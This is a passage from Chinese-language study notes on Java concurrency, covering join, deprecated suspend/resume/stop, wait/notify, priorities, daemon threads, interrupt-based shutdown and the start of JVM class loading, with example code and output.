 * 在主线程中调用thread.join(); 就是将主线程加入到thread子线程后面等待执行。不过有时间限制，为1毫秒。
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test1</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">MyThread</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//将主线程加入到子线程后面，不过如果子线程在1毫秒时间内没执行完，则主线程便不再等待它执行完，进入就绪状态，等待cpu调度  </span>
        t<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">30</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"线程第"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"次执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">MyThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"线程，第"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"次执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>在JDK中join方法的源码，如下：</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token keyword">long</span> millis<span class="token punctuation">)</span>  <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>  
    <span class="token keyword">long</span> base <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">long</span> now <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">if</span> <span class="token punctuation">(</span>millis <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"timeout value is negative"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
          
    <span class="token keyword">if</span> <span class="token punctuation">(</span>millis <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">isAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
           <span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">isAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            <span class="token keyword">long</span> delay <span class="token operator">=</span> millis <span class="token operator">-</span> now<span class="token punctuation">;</span>  
            <span class="token keyword">if</span> <span class="token punctuation">(</span>delay <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
                <span class="token keyword">break</span><span class="token punctuation">;</span>  
            <span class="token punctuation">}</span>  
            <span class="token function">wait</span><span class="token punctuation">(</span>delay<span class="token punctuation">)</span><span class="token punctuation">;</span>  
            now <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> base<span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>join方法实现是通过调用wait方法实现</strong>。当main线程调用t.join时候，<strong>main线程会获得线程对象t的锁（wait 意味着拿到该对象的锁)，调用该对象的wait(等待时间)，直到该对象唤醒main线程</strong>，比如退出后。<strong>这就意味着main 线程调用t.join时，必须能够拿到线程t对象的锁</strong>。</p>
<h4 id="6-5-suspend-resume-已过时">6.5 suspend &amp; resume (已过时)</h4>
<p>suspend-<strong>线程进入阻塞状态，但不会释放锁</strong>。此方法已不推荐使用，<strong>因为同步时不会释放锁，会造成死锁的问题</strong>。</p>
<p>resume-<strong>使线程重新进入可执行状态</strong>。</p>
<p>为什么 Thread.suspend 和 Thread.resume 被废弃了？</p>
<p>Thread.suspend 天生容易引起死锁。<strong>如果目标线程挂起时在保护系统关键资源的监视器上持有锁，那么其他线程在目标线程恢复之前都无法访问这个资源。如果要恢复目标线程的线程在调用 resume 之前试图锁定这个监视器，死锁就发生了</strong>。这种死锁一般自身表现为“冻结（ frozen ）”进程。</p>
<p><strong>其他相关资料：</strong></p>
<blockquote>
<p><a href="https://blog.csdn.net/dlite/article/details/4212915">https://blog.csdn.net/dlite/article/details/4212915</a></p>
</blockquote>
<h4 id="6-6-stop（已过时）">6.6 stop（已过时）</h4>
<p><strong>不推荐使用，且以后可能去除，因为它不安全</strong>。为什么 Thread.stop 被废弃了？</p>
<p>因为其天生是不安全的。<strong>停止一个线程会导致其解锁其上被锁定的所有监视器（监视器以在栈顶产生ThreadDeath异常的方式被解锁）</strong>。如果之前被这些监视器保护的任何对象处于不一致状态，其它线程看到的这些对象就会处于不一致状态。<strong>这种对象被称为受损的 （damaged）</strong>。当线程在受损的对象上进行操作时，会导致任意行为。这种行为可能微妙且难以检测，也可能会比较明显。</p>
<p><strong>不像其他未受检的（unchecked）异常， ThreadDeath 悄无声息的杀死及其他线程</strong>。因此，用户得不到程序可能会崩溃的警告。崩溃会在真正破坏发生后的任意时刻显现，甚至在数小时或数天之后。</p>
<p><strong>其他相关资料：</strong></p>
<blockquote>
<p><a href="https://blog.csdn.net/dlite/article/details/4212915">https://blog.csdn.net/dlite/article/details/4212915</a></p>
</blockquote>
<h4 id="6-7-wait-notify-notifyAll">6.7 wait &amp; notify/notifyAll</h4>
<p>wait &amp; notify/notifyAll这三个都是Object类的方法。使用 wait ，notify 和 notifyAll <strong>前提是先获得调用对象的锁</strong>。</p>
<blockquote>
<ol>
<li>调用 wait 方法后，释放持有的对象锁，<strong>线程状态有 Running 变为 Waiting</strong>，并将当前线程放置到对象的 <strong>等待队列</strong>；</li>
<li>调用notify 或者 notifyAll 方法后，<strong>等待线程依旧不会从 wait 返回，需要调用 noitfy 的线程释放锁之后，等待线程才有机会从 wait 返回</strong>；</li>
<li>notify 方法：<strong>将等待队列的一个等待线程从等待队列中移到同步队列中</strong> ，而 notifyAll 方法：<strong>将等待队列中所有的线程全部移到同步队列，被移动的线程状态由 Waiting 变为 Blocked</strong>。</li>
</ol>
</blockquote>
<p>前面一直提到两个概念，<strong>等待队列（等待池），同步队列（锁池）</strong>，这两者是不一样的。具体如下：</p>
<blockquote>
<p><strong>同步队列（锁池）</strong>：假设线程A已经拥有了某个对象（注意:不是类）的锁，而其它的线程想要调用这个对象的某个synchronized方法(或者synchronized块)，由于这些线程在进入对象的synchronized方法之前必须先获得该对象的锁的拥有权，但是该对象的锁目前正被线程A拥有，<strong>所以这些线程就进入了该对象的同步队列（锁池）中，这些线程状态为Blocked</strong>。</p>
<p><strong>等待队列（等待池）</strong>：假设一个线程A调用了某个对象的wait()方法，线程A就会释放该对象的锁（因为wait()方法必须出现在synchronized中，这样自然在执行wait()方法之前线程A就已经拥有了该对象的锁），同时 <strong>线程A就进入到了该对象的等待队列（等待池）中，此时线程A状态为Waiting</strong>。如果另外的一个线程调用了相同对象的notifyAll()方法，那么 <strong>处于该对象的等待池中的线程就会全部进入该对象的同步队列（锁池）中，准备争夺锁的拥有权</strong>。如果另外的一个线程调用了相同对象的notify()方法，那么 <strong>仅仅有一个处于该对象的等待池中的线程（随机）会进入该对象的同步队列（锁池）</strong>。</p>
</blockquote>
<h4 id="6-8-线程优先级">6.8 线程优先级</h4>
<p>每个线程执行时都有一个优先级的属性，<strong>优先级高的线程可以获得较多的执行机会，而优先级低的线程则获得较少的执行机会</strong>。与线程休眠类似，线程的优先级仍然无法保障线程的执行次序。只不过，<strong>优先级高的线程获取CPU资源的概率较大，优先级低的也并非没机会执行</strong>。</p>
<blockquote>
<p><strong>每个线程默认的优先级都与创建它的父线程具有相同的优先级，在默认情况下，main线程具有普通优先级</strong>；</p>
</blockquote>
<p>Thread类提供了setPriority(int newPriority)和getPriority()方法来设置和返回一个指定线程的优先级，其中setPriority方法的参数是一个整数，范围是1~10之间，也可以使用Thread类提供的三个静态常量：</p>
<pre class="line-numbers language-none"><code class="language-none">MAX_PRIORITY   =10
MIN_PRIORITY   =1
NORM_PRIORITY   =5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>注意一点</strong>：</p>
<blockquote>
<p>虽然Java提供了10个优先级别，但这些优先级别需要操作系统的支持。<strong>不同的操作系统的优先级并不相同，而且也不能很好的和Java的10个优先级别对应</strong>。所以我们应该使用MAX_PRIORITY、MIN_PRIORITY和NORM_PRIORITY三个静态常量来设定优先级，<strong>这样才能保证程序最好的可移植性</strong>。</p>
</blockquote>
<h4 id="6-9-守护线程">6.9 守护线程</h4>
<p>守护线程与普通线程写法上基本没啥区别，<strong>调用线程对象的方法setDaemon(true)</strong>，则可以将其设置为守护线程。</p>
<p>守护线程使用的情况较少，但并非无用，举例来说，<strong>JVM的垃圾回收、内存管理等线程都是守护线程</strong>。还有就是在做数据库应用时候，使用的数据库连接池，<strong>连接池本身也包含着很多后台线程，监控连接个数、超时时间、状态等等</strong>。</p>
<p><strong>setDaemon方法详细说明</strong>：</p>
<blockquote>
<p>public final void setDaemon(boolean on)：将该线程标记为守护线程或用户线程。<strong>当正在运行的线程都是守护线程时，Java 虚拟机退出</strong>。</p>
<p><strong>该方法必须在启动线程前调用</strong>。 该方法首先调用该线程的 checkAccess 方法，且不带任何参数。这可能抛出 SecurityException（在当前线程中）。</p>
<p><strong>参数：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">on - 如果为 true，则将该线程标记为守护线程。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>抛出：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">IllegalThreadStateException - 如果该线程处于活动状态。
SecurityException - 如果当前线程无法修改该线程。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">/** 
* Java线程：线程的调度-守护线程 
*/  
public class Test {  
        public static void main(String[] args) {  
                Thread t1 = new MyCommon();  
                Thread t2 = new Thread(new MyDaemon());  
                t2.setDaemon(true);        //设置为守护线程  
  
                t2.start();  
                t1.start();  
        }  
}  
  
class MyCommon extends Thread {  
        public void run() {  
                for (int i = 0; i &lt; 5; i++) {  
                        System.out.println("线程1第" + i + "次执行！");  
                        try {  
                                Thread.sleep(7);  
                        } catch (InterruptedException e) {  
                                e.printStackTrace();  
                        }  
                }  
        }  
}  
  
class MyDaemon implements Runnable {  
        public void run() {  
                for (long i = 0; i &lt; 9999999L; i++) {  
                        System.out.println("后台线程第" + i + "次执行！");  
                        try {  
                                Thread.sleep(7);  
                        } catch (InterruptedException e) {  
                                e.printStackTrace();  
                        }  
                }  
        }  
}  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行结果：</p>
<pre class="line-numbers language-none"><code class="language-none">后台线程第0次执行！  
线程1第0次执行！  
线程1第1次执行！  
后台线程第1次执行！  
后台线程第2次执行！  
线程1第2次执行！  
线程1第3次执行！  
后台线程第3次执行！  
线程1第4次执行！  
后台线程第4次执行！  
后台线程第5次执行！  
后台线程第6次执行！  
后台线程第7次执行！ 
复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>从上面的执行结果可以看出：<strong>前台线程是保证执行完毕的，后台线程还没有执行完毕就退出了</strong>。</p>
<blockquote>
<p>实际上：<strong>JRE判断程序是否执行结束的标准是所有的前台执线程行完毕了，而不管后台线程的状态，因此，在使用后台线程时候一定要注意这个问题</strong>。</p>
</blockquote>
<h4 id="6-10-如何结束一个线程">6.10 如何结束一个线程</h4>
<p><strong>Thread.stop()、Thread.suspend、Thread.resume、Runtime.runFinalizersOnExit</strong> 这些终止线程运行的方法已经被废弃了，使用它们是极端不安全的！想要安全有效的结束一个线程，可以使用下面的方法。</p>
<blockquote>
<ol>
<li>正常执行完run方法，然后结束掉；</li>
<li>控制循环条件和判断条件的标识符来结束掉线程；</li>
</ol>
</blockquote>
<p><strong>比如run方法这样写</strong>：只要保证在一定的情况下，run方法能够执行完毕即可。而不是while(true)的无限循环。</p>
<pre class="line-numbers language-none"><code class="language-none">class MyThread extends Thread {  
    int i=0;  
    @Override  
    public void run() {  
        while (true) {  
            if(i==10)  
                break;  
            i++;  
            System.out.println(i);  
              
        }  
    }  
}  
或者
class MyThread extends Thread {  
    int i=0;  
    boolean next=true;  
    @Override  
    public void run() {  
        while (next) {  
            if(i==10)  
                next=false;  
            i++;  
            System.out.println(i);  
        }  
    }  
}  
或者
class MyThread extends Thread {  
    int i=0;  
    @Override  
    public void run() {  
        while (true) {  
            if(i==10)  
                return;  
            i++;  
            System.out.println(i);  
        }  
    }  
}  
复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>诚然，使用上面方法的标识符来结束一个线程，是一个不错的方法，但其也有弊端，如果 <strong>该线程是处于sleep、wait、join的状态时候，while循环就不会执行</strong>，那么我们的标识符就无用武之地了，<strong>当然也不能再通过它来结束处于这3种状态的线程了</strong>。</p>
<p><strong>所以，此时可以使用interrupt这个巧妙的方式结束掉这个线程</strong>。我们先来看看sleep、wait、join方法的声明：</p>
<pre class="line-numbers language-none"><code class="language-none">public final void wait() throws InterruptedException 
public static native void sleep(long millis) throws InterruptedException
public final void join() throws InterruptedException
复制代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到，这三者有一个共同点，都抛出了一个InterruptedException的异常。<strong>在什么时候会产生这样一个异常呢</strong>？</p>
<blockquote>
<p><strong>每个Thread都有一个中断状状态，默认为false</strong>。可以通过Thread对象的isInterrupted()方法来判断该线程的中断状态。可以通过Thread对象的interrupt()方法将中断状态设置为true。</p>
<p>当一个线程处于sleep、wait、join这三种状态之一的时候，<strong>如果此时他的中断状态为true，那么它就会抛出一个InterruptedException的异常</strong>，并将中断状态重新设置为false。</p>
</blockquote>
<p>看下面的简单的例子：</p>
<pre class="line-numbers language-none"><code class="language-none">public class Test1 {  
    public static void main(String[] args) throws InterruptedException {  
        MyThread thread=new MyThread();  
        thread.start();  
    }  
}  
  
class MyThread extends Thread {  
    int i=1;  
    @Override  
    public void run() {  
        while (true) {  
            System.out.println(i);  
            System.out.println(this.isInterrupted());  
            try {  
                System.out.println("我马上去sleep了");  
                Thread.sleep(2000);  
                this.interrupt();  
            } catch (InterruptedException e) {  
                System.out.println("异常捕获了"+this.isInterrupted());  
                return;  
            }  
            i++;  
        }  
    }  
}  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试结果：</p>
<pre class="line-numbers language-none"><code class="language-none">1  
false  
我马上去sleep了  
2  
true  
我马上去sleep了  
异常捕获了false <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到，首先执行第一次while循环，在第一次循环中，睡眠2秒，然后将中断状态设置为true。<strong>当进入到第二次循环的时候，中断状态就是第一次设置的true，当它再次进入sleep的时候，马上就抛出了InterruptedException异常，然后被我们捕获了</strong>。然后中断状态又被重新自动设置为false了（从最后一条输出可以看出来）。</p>
<p>所以，我们可以使用interrupt方法结束一个线程。具体使用如下：</p>
<pre class="line-numbers language-none"><code class="language-none">public class Test1 {  
    public static void main(String[] args) throws InterruptedException {  
        MyThread thread=new MyThread();  
        thread.start();  
        Thread.sleep(3000);  
        thread.interrupt();  
    }  
}  
  
class MyThread extends Thread {  
    int i=0;  
    @Override  
    public void run() {  
        while (true) {  
            System.out.println(i);  
            try {  
                Thread.sleep(1000);  
            } catch (InterruptedException e) {  
                System.out.println("中断异常被捕获了");  
                return;  
            }  
            i++;  
        }  
    }  
} <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>多测试几次，会发现一般有两种执行结果：</p>
<pre class="line-numbers language-none"><code class="language-none">0  
1  
2  
中断异常被捕获了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者</p>
<pre class="line-numbers language-none"><code class="language-none">0  
1  
2  
3  
中断异常被捕获了 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这两种结果恰恰说明了，<strong>只要一个线程的中断状态一旦为true，只要它进入sleep等状态，或者处于sleep状态，立马回抛出InterruptedException异常</strong>。</p>
<blockquote>
<p><strong>第一种情况</strong>，是当主线程从3秒睡眠状态醒来之后，调用了子线程的interrupt方法，此时子线程正处于sleep状态，立马抛出InterruptedException异常。</p>
<p><strong>第二种情况</strong>，是当主线程从3秒睡眠状态醒来之后，调用了子线程的interrupt方法，此时子线程还没有处于sleep状态。然后再第3次while循环的时候，在此进入sleep状态，立马抛出InterruptedException异常。</p>
</blockquote>
<hr>
<h2 id="JVM-Class-Loader">JVM Class Loader</h2>
<h3 id="结束一个JVM的生命周期">结束一个JVM的生命周期</h3>
<ol>
<li>
<p>System.exit：<code>Runtime.getRuntime().exit(status)</code></p>
</li>
<li>
<p>正常执行结束</p>
</li>
<li>
<p>程序抛出异常</p>
</li>
<li>
<p>JVM Crash（异常）</p>
</li>
<li>
<p>操作系统/硬件异常</p>
</li>
</ol>
<h3 id="类加载的三个过程">类加载的三个过程</h3>
<p>查看class文件的二进制代码<code>javap -v BasicThread</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> target/classes/com/hots/part1/chapter1
javap <span class="token parameter variable">-v</span> BasicThread<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E4%B8%89%E4%B8%AA%E8%BF%87%E7%A8%8B.png" alt="类加载的三个过程"></p>
<ul>
<li>
<p>加载（Loading）: 查找并且加载类的二进制数据</p>
</li>
<li>
<p>链接（Linking）</p>
<ol>
<li>验证：确保被加载类的准确性</li>
<li>准备：为类的静态变量分配内存，<strong>并将其初始化为默认值</strong></li>
<li>解析：把类中的符号引用转换为直接引用</li>
</ol>
</li>
<li>
<p>初始化（Initialize）：为类的静态变量赋予正确的初始值</p>
</li>
</ul>
<h4 id="Java程序对类的使用方式：主动使用和被动使用">Java程序对类的使用方式：主动使用和被动使用</h4>
<p>除了下述六个外，其余的都是被动使用，不会导致类的初始化。</p>
<ol>
<li>
<p>new 直接使用</p>
</li>
<li>
<p>初始化一个子类，其父类也会被初始化</p>
</li>
<li>
<p>访问某个类或者接口的静态变量，或者对该静态变量进行赋值</p>
<ul>
<li>对类的静态变量进行读写</li>
<li>对接口的静态变量进行读取（默认 final static）</li>
</ul>
</li>
<li>
<p>调用静态方法</p>
</li>
<li>
<p>反射某个类</p>
</li>
<li>
<p>启动类。比如 java HelloWorld</p>
</li>
</ol>
<p>特例说明几个非主动引用：</p>
<ol>
<li>
<p>通过子类访问父类的static变量，不会导致子类的初始化（主动引用的是父类）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Child</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>定义引用数组，不会初始化类</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Obj</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrays <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Obj</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><code>final</code>修饰的==<strong>常量</strong>==会在编译期间放到常量池中，不会初始化类</p>
</li>
<li>
<p><code>final</code>修饰的==<strong>复杂类型</strong>==，在编译期间无法计算得出，会初始化类</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassActiveUse</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ClassActiveUse"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
        <span class="token comment">// final修饰的常量会在编译期间放到常量池中，不会初始化类</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"--------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// final修饰的复杂类型，在编译期间无法计算得出，会初始化类</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Obj</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Obj</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> salary <span class="token operator">=</span> <span class="token number">100000L</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Obj 被初始化."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassActiveUse</span>
<span class="token number">100000</span>
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
<span class="token class-name">Obj</span> 被初始化<span class="token punctuation">.</span>
<span class="token number">27</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h4 id="加载（Loading）">加载（Loading）</h4>
<h5 id="加载的定义">加载的定义</h5>
<p>将class文件中的二进制数据读取到内存中，将其放在方法区中，然后在堆中创建一个java.lang.Class对象，用来封装方法区的数据结构。</p>
<h5 id="加载类的方式">加载类的方式</h5>
<ul>
<li>
<p>本地磁盘中直接加载</p>
</li>
<li>
<p>内存中直接加载</p>
</li>
<li>
<p>通过网络加载class</p>
</li>
<li>
<p>从zip、jar等归档文件中加载.class文件</p>
</li>
<li>
<p>数据库中提取.class文件</p>
</li>
<li>
<p>动态编译</p>
</li>
</ul>
<h3 id="Class和Object对象在内存中">Class和Object对象在内存中</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220222143225196.png" alt="image-20220222143225196"></p>
<h5 id="创建一个对象的过程">创建一个对象的过程</h5>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220211165432806.png" alt="image-20220211165432806"></p>
<p>或者</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20220211165501885.png" alt="image-20220211165501885"></p>
<h4 id="链接（Linking）">链接（Linking）</h4>
<h4 id="初始化（Initialize）">初始化（Initialize）</h4>
<ul>
<li>
<p>类加载过程中的最后一步</p>
</li>
<li>
